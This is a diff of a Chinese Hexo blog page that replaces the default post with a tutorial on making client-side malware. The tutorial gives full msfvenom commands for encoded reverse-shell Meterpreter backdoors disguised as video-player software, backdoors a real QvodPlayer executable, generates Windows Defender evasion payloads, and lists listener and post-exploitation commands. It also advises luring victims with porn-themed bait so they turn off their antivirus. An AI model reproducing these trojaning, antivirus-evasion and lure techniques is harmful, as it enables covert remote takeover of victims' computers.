@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>Hello World | Hexo</title>
+  <title>制作windows和linux客户端恶意软件进行渗透 | Hexo</title>
 
   
     
@@ -411,7 +411,7 @@
 
 
 
-<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/7.jpg" style="background-repeat: no-repeat; background-size: cover; 
+<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/8.jpg" style="background-repeat: no-repeat; background-size: cover; 
   background-position: center center;position: relative;">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
@@ -419,14 +419,14 @@
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        Hello World
+        制作windows和linux客户端恶意软件进行渗透
       </span>
     </div>
     
     
       
         <span class="post-detail-header_date">
-          <i class="fa fa-calendar"></i> 发表于：2021-01-31 |
+          <i class="fa fa-calendar"></i> 发表于：2021-09-10 |
         </span>
       
 
@@ -448,15 +448,24 @@
     <article class="post post-detail">
       
       <div class="post-content">
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <p>昨天信誓旦旦说今天必早起跑步，额 醒来的时候一看手机八点了 然后自然的打开钉钉挂着网课，然后去梦里跑步了  哎 明天必早起 冲  </p>
+<h2 id="客户端渗透原理"><a href="#客户端渗透原理" class="headerlink" title="客户端渗透原理"></a>客户端渗透原理</h2><p> 在我们无法突破对方的网络边界的时候，往往需要使用客户端渗透这种方式对目标发起攻击，比如我们向目标发一个含有后门的程序，或者是一个word文档，pdf文件，想要达到效果同时也要利用好社会工程学，来诱骗受害者执行恶意程序<br> 客户端渗透技巧，通常用户的计算机都安装了安全软件，一般我们生成的恶意程序都会被检测，所以我们所设计的恶意软件可以利用人的劣根性，比如我们将恶意软件或者网站伪装成色情软件或网站，这样目标会认为他本身就是不好的软件被安全软件检测是很正常的事情，如果他按捺不住关闭安全防护软件执意要运行恶意程序，呢么他就中招了，当然这种取巧方法并不能解决所有问题，我们需要利用免杀来躲避安全软件的查杀</p>
+<h2 id="制作Windows恶意软件获取shell"><a href="#制作Windows恶意软件获取shell" class="headerlink" title="制作Windows恶意软件获取shell"></a>制作Windows恶意软件获取shell</h2><p>msfvenom是msfpayload，msfencode的结合体，可利用nsfvenom生成木马程序，并在目标机上执行，在本地监听上线</p>
+<p>生成西瓜影音.exe后门程序<br>使用一个编码器<br>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.68.53 LPOST=4444 -b “\x00” -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/西瓜影音1.exe<br>使用两个编码器组合编码<br>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.68.53 LPOST=4444 -b “\x00” -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 –platform windows -e x86/alpha_upper -i 10 -f exe -o /var/www/html/西瓜影音2.exe<br>参数说明：<br>-a  指定架构如x86 x64.x86代表32位，x64代表64位。43位软件可以在64位系统上运行，所以我们生成32位的后门，这样在32位和64位系统中都可以使用<br> –platform 指定平台，这里选择windows，通过 –l platforms 可以查看所有支持的平台<br> -p 设置攻击载荷，我们使用windows/meterpreter/reverse_tcp,可以通过-l payloads查看所有攻击载荷<br> LHOST 目标主机执行程序后连接我们KALI的地址<br> LPOST  目标主机执行程序后连接我们kali的端口<br> -b 去掉坏字符，坏字符会影响payload正常执行</p>
+<p>扩展：/x00代表十六进制的“00”组成的字符串。通过ASCLL码换成能识别的就是：“00” - “00000000” -NUL 由于“00000000”是不可见字符，所以代码中没用</p>
+<p>-e 指定编码器，也就是所谓的免杀， x86/shikata_ga_nai是msf自带的编码器，可以通过 -l encoders查看所有编码器<br> -i 指定payload有效载荷编码迭代次数。指定编码加密次数，为了让杀毒软件，更难查出源代码<br> -f 指定文件格式，可以是raw exe elf jar c语言的 Python的 java的。。。。用 -l formats 查看所有支持的格式<br> -o 指定文件名称和导出位置。指定到网站根目录/var/www/html,方便在肉机上下载后门程序<br> <img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/8c4e2f3b03574d25a03a01532e5c515b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>两个木马传好了，我们在windows上测试一下<br>systemctl start apache2<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/dc7d6220131d46aea9a7927c7cb2110a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><a target="_blank" rel="noopener" href="https://f.virscan.org/">https://f.virscan.org/</a><br>这个网站是在线漏洞扫描网站<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/3aac724437c84618b87710375c06e3ac.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p>
+<h2 id="在MSF上启动handler开始监听后门程序"><a href="#在MSF上启动handler开始监听后门程序" class="headerlink" title="在MSF上启动handler开始监听后门程序"></a>在MSF上启动handler开始监听后门程序</h2><p>msfdb run (启动监听）<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/50e9cfbc74354df68c6b3352d7c22a42.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>use exploit/multi/handler  用handler模块<br>show options<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/7745c76e2b1e4dc58a26c52463238fc7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p>
+<p>set payload windows/meter<br>set payload windows/meterpreter/reverse_tcp<br>show options<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/4551bc530b014d74999ac4a5b21a810f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p>
+<p>set LHOST 192.168.68.53 （设置本机ip）<br>run （开启监听）<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/ac1b260a9fcf486dae4ddb4263bb2fb0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>这边就开始打开win7里的木马<br>运行完木马之后，这边就建立了一个会话<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/730f7f7b19704a1fb203f970cf1df50a.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>getuid (查看权限）<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/a4eb052a4a4246dbaa74db0dcc5e4e85.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>发现不是最高权限 是管理员权限<br>getsystem 得到最高权限<br>getpid 查看当前木马程序占用的进程id<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/1fa3c96201244e20b8087f540d15104c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>ps 查看目标机的进程文件<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/df77d3b352b74c71b73270c7b6ebcfb1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>reboot  对win7直接进行重启<br>sysinfo （查看系统数据）<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/c92159ffc1414303aeff334ae7cefd56.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>拍照：screenshot<br>实时监控 run vnc<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/bb25d5b7033f403e8bae378866b3f4d1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p>
+<h2 id="模拟黑客给真正的快播软件加上后门"><a href="#模拟黑客给真正的快播软件加上后门" class="headerlink" title="模拟黑客给真正的快播软件加上后门"></a>模拟黑客给真正的快播软件加上后门</h2><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/2d3e3cc7ba2a4636ab81ec1dc872c9dd.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/ae8b46472bfd4af790614d82f7f8e9b5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>发现第一个是主程序，下面的是副程序，运行主程序下面的程序也会跟着打开<br>所以我们给下面的快播软件注入木马<br>其实原理就是 我们在我们的kali里生成一个快播木马软件，然后目标机打开链接，执行程序 所以    。。。 你还敢看小huang吗 。。 在此警告 </p>
+<p>对QvodTerminal.exe 注入 payload后门程序<br><strong>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.68.53 LPOST=4444 -b”\x00” -e x86/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe</strong><br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/cdd054a7fb21475daf43d26b5febf032.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>systemctl start apache2<br>然后在win7上下载下来这个文件</p>
+<p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/f97b0627c1504c39b348f064b2fee6da.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>打开kuaibo就拿到了权限 建立回话</p>
+<h2 id="使用metasploit的evasion模块生成后门"><a href="#使用metasploit的evasion模块生成后门" class="headerlink" title="使用metasploit的evasion模块生成后门"></a>使用metasploit的evasion模块生成后门</h2><p>evasion是metasploit自带的模块，使用此模块可以生成反杀毒软件的木马<br>search evasion<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/16273a26c5114be989c834506e1981bd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>use evasion/windows/windows_defender_exe<br>show options<br>set FILENAME H0ne.exe<br>set payload windows/meterpreter/reverse_tcp<br>run</p>
+</blockquote>
+<p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/deed3138c0ae404fb451d0eac59f9234.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>把生成的文件拷贝到根目录下 方便下载<br>cp /home/chillman/.msf4/local/H0ne.exe /var/www/html<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/0dfa57ec80ff4e7f8b21312af72c8352.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p>
+<p>然后开始监听<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/c6770850b49c4c99881182f9d2ef0715.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>use exploit/multi/handler<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 192.168.68.53<br>show options<br>win7打开文件 这里就拿到了权限<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/52693962bc8148dc840a4df18930a1ca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBASDBuZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p>
 
       </div>
       <div class="post-tags-categories">
@@ -470,7 +479,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2021/01/31/hello-world/" target="_blank" title="Hello World">http://example.com/2021/01/31/hello-world/</a>
+    <a href="/2021/09/10/制作windows和linux客户端恶意软件进行渗透/" target="_blank" title="制作windows和linux客户端恶意软件进行渗透">http://example.com/2021/09/10/制作windows和linux客户端恶意软件进行渗透/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -488,25 +497,23 @@
 
 
 
+
+
   
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img lazyload" data-original="/medias/3.jpg" style="background-size: cover; 
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img lazyload" data-original="/medias/10.jpg" style="background-size: cover; 
       background-position: center center;">
     </div>
-    <a href="/2021/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%B0RCE/" class="post-nav-link">
+    <a href="/2021/09/08/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E4%BB%A5%E5%8F%8AMetaspoit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/" class="post-nav-link">
       <div class="title">
-        <i class="fa fa-angle-left"></i> 上一篇:
-        <div class="title-text">渗透测试从代码审计到RCE</div>
+        下一篇: <i class="fa fa-angle-right"></i>
+        <div class="title-text">NESSUS漏洞检测以及Metaspoit渗透测试框架的基本使用</div>
       </div>
-      
       <!-- <div class="content">
-        @TOC
-前言一、代码审计前的准备把握大局：网站结构：浏览源码文件夹，了解该程序的大致目录入口文件：index.php,
+        NESSUS漏洞检测NESSUS简介1998年, Nessus 的创办人 Renaud Deraison 展开了一项名为
       </div> -->
     </a>
   </div>
-
-
 
 </div>
 
